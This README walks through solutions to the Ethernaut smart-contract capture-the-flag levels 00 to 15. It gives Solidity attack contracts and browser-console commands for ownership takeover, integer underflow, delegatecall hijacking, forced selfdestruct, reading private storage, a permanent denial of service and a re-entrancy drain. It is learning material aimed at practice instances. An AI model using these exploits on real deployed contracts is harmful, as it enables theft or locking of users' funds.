# Ethernaut Solutions

Solution to the Ethernaut challenges!

## 00 - Hello Ethernaut

For Reference -> [Challenge](./questions/00.Hello_Ethernaut.sol) | [Solution](./answers/00.Hello_Ethernaut.js)

This one's a warm-up. All you have to do is call `info()`, if still confused then check the solution.

## 01 - Fallback

For Reference -> [Challenge](./questions/01.Fallback.sol) | [Solution](./answers/01.Fallback.js)

Here I used the browser's console to solve this challenge. We are going to take the advantage of `receive` function after which some ether could be sent to the contract and we will become the owner.

1. First, let's contribute a small amount less than 0.001 ether after converting ether to wei using `toWei` function within the console itself.

```javascript
    toWei(".0001") // 100000000000000

    await contract.contribute({value: 100000000000000})
```

2. Now, send some ether into the contract by taking advantage of the `receive` function.

```javascript
    await contract.sendTransaction({value: 1})
```

3. Finally, check for the owner whether it's you or not and upon confirmation withdraw the funds

```javascript
    await contract.owner()
    await contract.withdraw()
```

4. At last submit the instance

## 02 - Fallout

For Reference -> [Challenge](./questions/02.Fallout.sol) | [Solution](./answers/02.Fallout.js)

There's a blunder in the constructor name itself as it doesn't matches with the contract name.

Just call the `Fal1out` function and you will be the owner.

```javascript
    await contract.Fal1out()
```

## 03 - Coin Flip

For Reference -> [Challenge](./questions/03.Coin_Flip.sol) | [Solution](./answers/03.Coin_Flip.sol)

This challenge needs us to deploy a attack contract which will always win the coin flip. The contract is already provided in the [solution](./answers/03.Coin_Flip.sol) file. Although, it's well explained under the solution file itself but still let me walk you through the main `attack` function.

The reason why we are able to win the coin flip is because the `blockhash` function is used to calculate the `blockValue` and the `blockhash` function is only able to access the last 256 blocks. So, if we call the `attack` function multiple times in the same block, the `blockhash` function will return the same value and hence the `coinFlip` will be the same.

1. The `attack` function looks like this:

```solidity
    function attack() external {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
```

2. At first, we calculate the `blockValue` by using the `blockhash` function.

3. Then, we calculate the `coinFlip` by dividing the `blockValue` with the `FACTOR` which is 57896044618658097711785492504343953926634992332820282019728792003956564819968

4. Then we calculate the `side` by checking if the `coinFlip` is equal to 1 or not.

5. Finally, we call the `flip` function of the `coinflip` contract with the `side` as the argument.

6. Remember to call the `attack` function 10 times in order to win the challenge.

## 04 - Telephone

For Reference -> [Challenge](./questions/04.Telephone.sol) | [Solution](./answers/04.Telephone.sol)

All we need is to call the `attack` function within the [Solution](./answers/04.Telephone.sol) contract after deploying it.

```solidity
    function attack() public {
        telephone.changeOwner(address(this));
    }
```

The reason this works is because of the vulnerable condition - `(tx.origin != msg.sender)` in the `changeOwner` function of the `Telephone` contract. The `tx.origin` is the original sender of the transaction and `msg.sender` is the current sender of the transaction. So, when we call the `attack` function, the `msg.sender` is the address of the `Solution` contract and the `tx.origin` is the address of the EOA. Hence, the condition `(tx.origin != msg.sender)` is true and the `changeOwner` function is executed.

## 05 - Token

For Reference -> [Challenge](./questions/05.Token.sol) | [Solution](./answers/05.Token.js)

To crack this challenge, one need to have a knowledge of underflows and overflows...
Now, here we have 20 tokens and if we send someone 21 tokens which seems kind of impossible but wait, we are using `uint` here that means it can go negative and hence the balance will be 2^256 - 21 which is a huge number and hence the balance will be huge.

If we look at `transfer` function below:

```solidity
    function transfer(address _to, uint _value) public returns(bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

Here, if we call the `transfer` function with `_to` as someone's address and `_value` as 21, then `20 - 21 -> -1 <=> 2^256` and hence the balance will be huge.

1. Let's first check our current balance which gonna be 20 tokens

```javascript
    await contract.balanceOf(player)
```

2. Now transfer 21 tokens to someone's address

```javascript
    await contract.transfer("anyone-address", 21)
```

## 06 - Delegation

For Reference -> [Challenge](./questions/06.Delegation.sol) | [Solution](./answers/06.Delegation.js)

This is an interesting challenge and for this you need to have certain knowledge of how delegate calls works and can be manipulated in phase of vulnerability.
An interesting activity is provided in [Bonus](/Ethernaut/Bonus/DelegateCalls/) section which will help you understand a little concept about delegate calls. Research on your own basis will be helpful.

Now, let's come to the challenge:

1. First, we need to check which contract we are interacting with - `Delegate` or `Delegation`.

```shell
    contract.abi
```

2. Now we will make a variable that contains our call to `pwn` and then that call will send through an transaction to the `Delegation` contract. As `Delegation` contract contains a `fallback` function that usually take any transaction and then delegate it to the `Delegate` contract.

```javascript
    var pwned = web3.utils.keccak256("pwn()")
    await contract.sendTransaction(pwned)
```

3. At last, check the owner and submit!

```javascript
    await contract.owner()
```

## 07 - Force

For Reference -> [Challenge](./questions/07.Force.sol) | [Solution](./answers/07.Force.sol)

At first, this challenge seems confusing but as you dig a little bit deeper you will find `selfdestruct` function which is the key to solve this challenge. What `selfdestruct` do is, it will destroy the contract (where it is used) and send all the ether to the address provided as an argument.

1. First, deploy the contract provided in [Solution](./answers/07.Force.sol) file. The contract will take the address of the victim contract as an argument.

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface Force{}

    contract Hack{
        Force public force;

        constructor(address _victim) {
            force = Force(payable(_victim));
        }

        // This is the attack function, and make sure it be payable
        function attack() external payable{
            selfdestruct(payable(address(force)));
        }
    }
```

2. Now, call the `attack` function which will destroy the contract and send all the ether to the victim contract.

3. At last, check the balance of the victim contract and submit!

```javascript
    await contract.balance()
```

## 08 - Vault

For Reference -> [Challenge](./questions/08.Vault.sol) | [Solution](./answers/08.Vault.js)

This challenge has to do with private Storages, thus it be better to get a understanding of it and you can also refer it through one of the [bonuses](./Bonus/PrivateStorages) section.

Let's come to this challenge, first thing is - `private` doesn't mean your data is secure, it just means that it's not accessible through the contract's ABI. But, it can still be accessed by other contracts. Thus, we will be using `getStorageAt` function to get the value of the `password` variable.

1. First initialize the address of our instance in a separate variable

```javascript
    var addr = 'your contract address'
```

2. Now we will get storage of slot1

```javascript
    await web3.eth.getStorageAt(addr, 1)
```

3. Copy that hexadecimal value you got from 2nd step, and pass it here!

```javascript
    await contract.unlock("your_hexadecimal_value")
```

## 09 - King

For reference -> [Challenge](./questions/09.King.sol) | [Solution](./answers/09.King.sol)

This is an interesting challenge and also based on a real dapp which kind of did the same thing. The challenge is all about disrupting the system and become the king which can't be de-throned.

All you need to know is how the `fallback` function works and some details about `transfer` function in solidity. Here, the issue is in `receive` function which is using `transfer` function to send the ether to the previous king. The `transfer` function has a gas limit of 2300 and if the gas limit is exceeded then the transaction will be reverted. And that's the key to solve this challenge.

```solidity
    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
```

1. Deploy the contract provided in [Solution](./answers/09.King.sol) file with the address of the king contract as an argument and also send the ether more than the current highest value.

2. You will made king of the contract and now whenever someone tries to become the king, the transaction will be reverted as the gas limit will exceed and no one can replace you.

## 10 - Re-entrancy

For reference -> [Challenge](./questions/10.Re-entrancy.sol) | [Solution](./answers/10.Re-entrancy.sol)

This challenge is all about re-entrancy attack and how it can be prevented. The `withdraw` function is vulnerable to re-entrancy attack as it first sends the ether to the caller and then updates the balance. So, if the caller is a malicious contract, it can call the `withdraw` function again and again before the balance is updated.

```solidity
    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```

To hack this, we will deploy a malicious contract that will call the `withdraw` function again and again before the balance is updated.

1. Deploy the contract provided in [Solution](./answers/10.Re-entrancy.sol) file.

2. Call the `hack` function and also send 0.001 ether to it. The `hack` function will send 0.001 ether to the malicious contract and will withdraw it immediately, `withdraw()` will trigger the receive function and then the magic starts!

```solidity
    // Send 0.001 ether and withdraw immediately
    // This will trigger the receive function when withdraw() is called on Reentrance contract
    function hack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        // This will trigger the receive() the function
        reentrance.withdraw(msg.value);

        require(address(reentrance).balance == 0, "FAILED!!!");

        // Recover sent ether
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = reentrance.balanceOf(address(this));

        // Try to withdraw the smallest amount possible, so that the transaction does not revert
        uint256 withdrawableAmount = balance < 0.001 ether
            ? balance
            : 0.001 ether;

        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
        if (withdrawableAmount > 0) {
            reentrance.withdraw(withdrawableAmount);
        }
    }    
```

## 11 - Elevator

For reference -> [Challenge](./questions/11.Elevator.sol) | [Solution](./answers/11.Elevator.sol)

This challenge gives a knowledge about how interfaces could be vulnerable and thus manipulated. The `Elevator` contract contains an interface `Building` which has a function `isLastFloor`, all we have to do is create another contract named as `Building` and present it with the `isLastFloor` function that returns `false` at first and returns `true` upon calling it again. This is done because the `goTo` function demands such functionality from that `floor` parameter which be provided to it, Take a look at `Elevator` contract:

```solidity
    contract Elevator {
        bool public top;
        uint public floor;

        function goTo(uint _floor) public {
            Building building = Building(msg.sender);

            if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
            }
        }
    }
```

Thus, we be creating a contract named as `Building` and providing it with both `isLastFloor` and `goTo` functions which will help us in reaching the top floor. The contract is provided in the [Solution](./answers/11.Elevator.sol) file, and here's a glimpse of that `isLastFloor` function I was talking about:

```solidity
    bool public toggle = true;

    function isLastFloor(uint) public returns(bool){
        toggle = !toggle;
        return toggle;
    }
```

Look at the way `isLastFloor` is implemented above, as when `goTo` function will call it once it will return `false` the first time and then will return true.

Hence, deploy the solution contract and call `goTo`

## 12 - Privacy

For reference -> [Challenge](./questions/12.Privacy.sol) | [Solution](./answers/12.Privacy.sol)

This challenge is all about how private variables can be accessed and thus when a storage variable is marked with keyword `private`, it doesn't means that data cannot be accessed. The `Privacy` contract looks like this:

```solidity
    contract Privacy {
        bool public locked = true;
        uint256 public ID = block.timestamp;
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(now);
        bytes32[3] private data;

        constructor(bytes32[3] memory _data) public {
            data = _data;
        }

        function unlock(bytes16 _key) public {
            require(_key == bytes16(data[2]));
            locked = false;
        }
    }
```

If you notice, to unlock the `locked` i.e make it true...we need to pass the `bytes16` key which is the last elementof the `data` array. Now, let's see on which slot our required `key` resides:

```typescript
| Slot 0 | bool locked |
| Slot 1 | uint256 ID |
| Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
| Slot 3 | bytes32 data[0] |
| Slot 4 | bytes32 data[1] |
| Slot 5 | bytes32 data[2] |
```

Hence it lies on 5th slot, so all we need to do is get the storage of 5th slot and pass it to the `unlock` function. But there's one more thing i.e the value we get in slot 5th is a 32-bytes value whereas unlock requires a 16-bytes value, that's why we be using another contract to solve this problem.

***Note: If you having any trouble in understanding the private storages and how they work, refer to the [Bonus](./Bonus/PrivateStorages/) section.***

Now, let's solve this challenge:

1. Deploy the contract provided in [Solution](./answers/12.Privacy.sol) file.

2. Get the key from the 5th slot, by using the `web3.eth.getStorageAt` function in your browser's console.

```javascript
    await web3.eth.getStorageAt(contract.address, 5, console.log) // console.log will print the key such that we can copy it down
```

3. Now, pass the key as an argument to `attack` function. This will first turn our 32-bytes value to 16-bytes and then call the `unlock` function of `Privacy` contract.

```solidity
    function attack(bytes32 _slotValue) external {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key); // where target is the instance of Privacy contract
    }
```

4. At last check whether the `locked` is true or not and submit!

```javascript
    await contract.locked()
```

## 13 - Gatekeeper One

For reference -> [Challenge](./questions/13.Gatekeeper_One.sol) | [Solution](./answers/13.Gatekeeper_One.sol)

This challenge was quite difficult to understand in first go, but that's ok it's part of the process. you need to get familiar with certain topics like:

- Bit masking
- tx.origin vs msg.sender
- opcodes
- what is gasleft()

Coming to the question, one need to break 3 gates in order to pass this challenge.

`GateOne`: You must have seen it before and we know that in order to break it, all we have to do is call the `enter` function from some other contract.

```solidity
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```

`GateTwo`: This gonna use up some brute force technique, mainly using `gasleft()` in a way such that we meet the required condition.

```solidity
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
```

`GateThree`: Need an understanding of conversion between uint and bytes, bit masking and some other math stuff!

```solidity
    modifier gateThree() {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```

To solve the third gate, you can see our key is hidden in last condition which is `uint16(uint160(tx.origin))`. Here, `tx.origin` will be our wallet address, let's suppose mine is `0x9aFE8fCbc8465b73319520AFEDba0C0179f26D97` which is 20 bytes (each byte covering up 2 characters)

Thus, according to the last condition:

```typescript
    uint32((uint64(_gateKey))) == uint16((uint160(tx.origin))) ==  0x6D97 == 0x00006D97
                                                                   uint16      uint32
```

***Note: when a 20 bytes address is converted into a lower bytes, the left side bytes be the one to be removed.***

Now let's go through the first part of gate three, the condition says -> `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` which means our key should be same in both uint16 and uint32. Thus, `0x6D97 == 0x00006D97` which is true.

Here comes the 2nd part of gate three, the condition says -> `uint32(uint64(_gateKey)) != uint64(_gateKey)` which means our uint32 key shouldn't be equal to uint64 key. The only way it could be possible if we mask our key of 8 bytes (i.e uint64) with `0xFFFFFFFF0000FFFF` which will satisfy that condition.
After masking, our key now is `0xEDba0C0100006D97` which is 8 bytes. Thus, we know with what to mask our key now -> `0xFFFFFFFF0000FFFF`

At last, deploy the contract provided in [Solution](./answers/13.Gatekeeper_One.sol) file. Here's the main `hack` function and a detailed reason and solution in tackling the `gateTwo`:

```solidity
    function hack(uint start, uint end) public{
        // Now what's we doing here, just using a brute force technique
        // Here 8191 will be the multiplied by any number greater than 3 such that enough gas is provided for this function to call, and then 150 is added, just to make it more precise for some gasleft context, and then hit and trial thing is done with for loop iterations!!

        // Make sure to try different value of 'start' and 'end' ranging from 0 to 500
        for(uint i = start; i < end; i++){
            (bool result, bytes memory data) = address(keeperOne).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (result){
                break;
            }
        }
    }
```

Call the `hack` function and submit the instance...Cheers!

## 14 - Gatekeeper Two

For reference -> [Challenge](./questions/14.Gatekeeper_Two.sol) | [Solution](./answers/14.Gatekeeper_Two.sol)

Just like the previous challenge, we have to pass through three gates in order to solve this challenge. First gate is similar to the previous challenge i.e call the `enter` function through different contract. Now let's look at second gate modifier:

```solidity
    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }
```

Here, the `extcodesize` function is used to get the size of the code at the address provided as an argument. If the size is 0, then the address is an EOA otherwise it's a contract. But we can't really use an EOA as then the other gates won't be cleared away. Thus, there's a trick and a thing to remember i.e when a contract is deployed and it's constructor is called then the `extcodesize` will return 0. Thus, this gate is solved

Now, let's look at the third gate modifier:

```solidity
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }
```

Here, our `gateKey` should be '^' or 'XOR' of `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` such that it could be equal to `type(uint64).max` i.e `0xFFFFFFFFFFFFFFFF`. Do check about XOR if you are not familiar with it.

So in order to solve this gate, we be using `~` which is a bitwise NOT operator and helps in finding the complement of any particular value. The reason we need a complement here is, In the equation A ^ B = X, our X is clear i.e '0xFFF...', A is clear i.e keccak hash of msg.sender which be the address of the contract we be using to call the `enter` function of `Gatekeeper Two` contract. The only value which is unknown is our gateKey and obviously it be the complement of A, thus our key is `~bytes8(keccak256(abi.encodepacked(address(this))))`

Before deploying our [solution](./answers/14.Gatekeeper%20Two.sol) let's look at it:

```solidity
    contract Attack{
        // Here, I am solving this using my first method
        // But you can consider even use this code -> bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));

        constructor(address victim){
            // Here we called the function at the time of deployment, thus bypassing the second gate!
            GateKeeperTwo(victim).enter(key);
        }
    }
```

It will automatically call the `enter` function as you deploy it...Cheers!

## 15 - Naught Coin

For reference -> [Challenge](./questions/15.Naught_Coin.sol) | [Solution](./answers/15.Naught_Coin.js)

In this challenge, we got a contract with some tokens minted in our name in a large quantity called Naught Coin. Our task is to send these tokens to some random address but the problem is this contract have applied a so called modifier `lockTokens` which prevents us from taking out our tokens for around 10 years.

```solidity
    uint public timelock = block.timestamp + 10 * 365 days;

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timelock);
            _;
        } else {
            _;
        }
    }
```

In order to solve this challenge, we be using two functions related to ERC20 contract i.e `approve` and `transferFrom`. The `approve` function is used to approve the any contract to spend some tokens on our behalf and the `transferFrom` function is used to transfer the tokens from our account to some other account. That's it!

Just follow the steps provided in the [Solution](./answers/15.Naught_Coin.js) file and you are good to go!

## Contributing

Contributions to the Ethernaut_Practice project are welcome! If you have a solution to a challenge that is not yet included, or if you have suggestions for improvements, feel free to open a pull request.
